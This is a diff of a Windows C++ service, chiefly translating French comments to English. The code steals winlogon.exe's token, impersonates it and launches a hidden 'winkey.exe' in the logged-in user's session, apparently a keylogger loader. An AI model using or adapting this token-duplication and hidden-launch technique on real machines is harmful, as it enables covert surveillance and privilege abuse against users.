@@ -1,8 +1,6 @@
 #include "svc.hpp"
 
 
-
-
 DWORD FindTargetPID(const wchar_t* targetName)
 {
 	PROCESSENTRY32W pe;
@@ -28,6 +26,8 @@ DWORD FindTargetPID(const wchar_t* targetName)
 	return 0;
 }
 
+
+// InstallService: Installs the service in the Service Control Manager (SCM).
 int InstallService()
 {
 	
@@ -105,6 +105,7 @@ int StartService()
     return 1;
 }
 
+// StopService: Stops the service if it is running.
 int StopService()
 {
 	SC_HANDLE schSCManager;
@@ -129,6 +130,8 @@ int StopService()
     return 1;
 }
 
+
+// DeleteService: Deletes the service from the Service Control Manager (SCM). It needs to be stopped first.
 int DeleteService()
 {
 	SC_HANDLE schSCManager;
@@ -154,21 +157,20 @@ int DeleteService()
 }
 
 
-// ServiceMain: Entry point for the service.
-// Parameters:
-//   argc  - Number of command line arguments.
-//   argv  - Array of command line arguments.
+// ServiceMain: The main function of the service, called by the Service Control Manager (SCM).
 VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 {
     UNREFERENCED_PARAMETER(argc);
     UNREFERENCED_PARAMETER(argv);
 
+    // Register the service control handler
     g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);
     if (g_StatusHandle == NULL)
     {
         return;
     }
 
+    // Initialize the service status structure
     ZeroMemory(&g_ServiceStatus, sizeof(g_ServiceStatus));
     g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
     g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
@@ -182,6 +184,7 @@ VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
         return;
     }
 
+    // Create the service stop event
     g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
     if (g_ServiceStopEvent == NULL)
     {
@@ -193,6 +196,7 @@ VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
         return;
     }
 
+    // Report that the service is starting
     g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
     g_ServiceStatus.dwWin32ExitCode = 0;
     g_ServiceStatus.dwCheckPoint = 0;
@@ -205,6 +209,7 @@ VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
         return;
     }
 
+    // Create a worker thread to run the service
     HANDLE hThread = CreateThread(NULL, 0, ServiceWorkerThread, NULL, 0, NULL);
     if (hThread != NULL)
     {
@@ -216,6 +221,7 @@ VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
         g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
     }
 
+    // Cleanup and set the service status to stopped
     if (g_ServiceStopEvent != NULL)
         CloseHandle(g_ServiceStopEvent);
 
@@ -225,6 +231,8 @@ VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
     SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
 }
 
+
+// ServiceCtrlHandler: Handles service control requests from the Service Control Manager (SCM).
 VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode)
 {
     switch (CtrlCode)
@@ -239,7 +247,7 @@ VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode)
         g_ServiceStatus.dwCheckPoint = 4;
         SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
 
-        // Terminer le processus winkey.exe
+        // Terminate the worker thread and process
         if (g_ProcessInfo.hProcess != NULL)
         {
             TerminateProcess(g_ProcessInfo.hProcess, 0);
@@ -255,25 +263,28 @@ VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode)
     }
 }
 
+// ServiceWorkerThread: The worker thread that runs the service logic.This is where all start, just like the main function in a normal program.
 DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
 {
 	UNREFERENCED_PARAMETER(lpParam);
     STARTUPINFO si;
     TCHAR szPath[MAX_PATH];
     TCHAR szDir[MAX_PATH];
+    // Initialize the service status
     DWORD sessionId = WTSGetActiveConsoleSessionId();
     if (sessionId == 0xFFFFFFFF)
     {
         return ERROR_PROCESS_ABORTED;
     }
 
+    // Get the user token for the active session
     HANDLE htoken = NULL;
     if (!WTSQueryUserToken(sessionId, &htoken))
     {
         return ERROR_PROCESS_ABORTED;
     }
 
-    // recuperer le token de sécurité d'un processus et l'utiliser pour créer un processus dans la session utilisateur
+    // Get the security token of a process and use it to create a process in the user session
     const wchar_t* targetProcess = _T("winlogon.exe");
     DWORD pid = FindTargetPID(targetProcess);
     if (pid == 0)
@@ -281,23 +292,28 @@ DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
         CloseHandle(htoken);
         return ERROR_PROCESS_ABORTED;
     }
+
+    // Open the target process to get its token
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 	if (!hProcess)
 	{
 		return 1;
 	}
+    // Get the process token and duplicate it for impersonation
     if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &htoken))
     {
         CloseHandle(hProcess);
         CloseHandle(htoken);
         return ERROR_PROCESS_ABORTED;
     }
+    // Duplicate the token to allow impersonation
     if (!DuplicateTokenEx(htoken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &htoken))
     {
         CloseHandle(hProcess);
         CloseHandle(htoken);
         return ERROR_PROCESS_ABORTED;
     }
+    // Impersonate the user associated with the token
     if (!ImpersonateLoggedOnUser(htoken))
     {
         CloseHandle(hProcess);
@@ -307,24 +323,24 @@ DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
     
 
 
-    // Obtenir le répertoire du service
+    // Get service executable path
     GetModuleFileName(NULL, szPath, MAX_PATH);
     _tcscpy_s(szDir, MAX_PATH, szPath);
     TCHAR* lastSlash = _tcsrchr(szDir, _T('\\'));
     if (lastSlash) *lastSlash = _T('\0');
 
-    // Construire le chemin vers winkey.exe
+    // Make winkey.exe path string
     _stprintf_s(szPath, MAX_PATH, _T("%s\\winkey.exe"), szDir);
 
     ZeroMemory(&si, sizeof(si));
     si.cb = sizeof(si);
-    si.lpDesktop = _T("winsta0\\default"); // Desktop interactif
+    si.lpDesktop = _T("winsta0\\default"); // Default desktop
     si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE; // Cacher la fenêtre
+    si.wShowWindow = SW_HIDE;
 
     ZeroMemory(&g_ProcessInfo, sizeof(g_ProcessInfo));
 
-    // Lancer winkey.exe dans la session utilisateur
+    // Start winkey.exe in the user session
     if (!CreateProcessAsUser(htoken, NULL, szPath, NULL, NULL, FALSE, 
                            CREATE_NEW_CONSOLE, NULL, szDir, &si, &g_ProcessInfo))
     {
@@ -332,13 +348,13 @@ DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
         return GetLastError();
     }
 
-    // Attendre que le service soit arrêté ou que le processus se ferme
+    // Wait for the service to stop or the process to exit
     HANDLE handles[2] = { g_ServiceStopEvent, g_ProcessInfo.hProcess };
     DWORD waitResult = WaitForMultipleObjects(2, handles, FALSE, INFINITE);
 
     if (waitResult == WAIT_OBJECT_0)
     {
-        // Service arrêté - terminer le processus
+        // Service stopped, close the process
         TerminateProcess(g_ProcessInfo.hProcess, 0);
     }
 
@@ -350,16 +366,17 @@ DWORD WINAPI ServiceWorkerThread(LPVOID lpParam)
 
 int _tmain(int argc, TCHAR *argv[])
 {
-    // Si aucun argument, c'est le SCM qui lance le service
+    // If no arguments, the SCM is starting the service
     if (argc == 1)
     {
-        // Point d'entrée du service - appelé par le SCM
+        // Service entry point - called by the SCM
         SERVICE_TABLE_ENTRY ServiceTable[] = 
         {
             { SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
             { NULL, NULL }
         };
 
+        // Start the service control dispatcher it blocks until the service is stopped
         if (StartServiceCtrlDispatcher(ServiceTable) == FALSE)
         {
             return 1;
